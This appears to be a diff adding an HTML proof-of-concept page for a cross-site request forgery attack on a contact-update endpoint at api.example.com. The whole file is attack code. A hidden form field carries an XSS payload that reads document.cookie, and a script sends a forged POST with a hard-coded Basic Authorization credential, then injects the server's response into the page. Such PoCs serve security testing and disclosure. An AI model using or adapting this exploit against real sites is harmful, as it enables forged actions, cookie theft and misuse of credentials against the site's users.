@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF PoC</h1>
+    <form action="https://api.example.com/contact/update" method="POST" id="csrf-form">
+        <input type="hidden" name="l" value="<img src=x onerror=alert(document.cookie)>" />
+        <!-- Include any other necessary form fields -->
+        <input type="submit" value="Submit request" />
+    </form>
+
+    <!-- JavaScript to automatically submit the form with an Authentication header -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var form = document.getElementById("csrf-form");
+
+            form.addEventListener("submit", function (e) {
+                e.preventDefault(); // Prevent the default form submission
+
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://api.example.com/contact/update", true);
+
+                // Set the "Authorization" header
+                xhr.setRequestHeader("Authorization", "Basic cmVtb3RlLXNpZ251cDpzfGdubTN1cA==");
+
+                // Get the unencoded value of the "l" input
+                var lValue = form.elements.l.value;
+
+                // Construct the request body as a query string
+                var requestBody = "l=" + lValue;
+
+                // Set the Content-Type header to indicate form data
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+                // Define a callback function to handle the response
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4) {
+                        // Handle the response here
+                        if (xhr.status === 200) {
+                            console.log("Request successful");
+                            console.log(xhr.responseText);
+
+                            // Assuming the response is HTML content, you can display it on your page
+                            var responseHtml = xhr.responseText;
+                            document.body.innerHTML = responseHtml;
+                        } else {
+                            console.log("Request failed with status: " + xhr.status);
+                        }
+                    }
+                };
+
+                // Send the XMLHttpRequest with the constructed request body
+                xhr.send(requestBody);
+            });
+        });
+    </script>
+</body>
+</html>
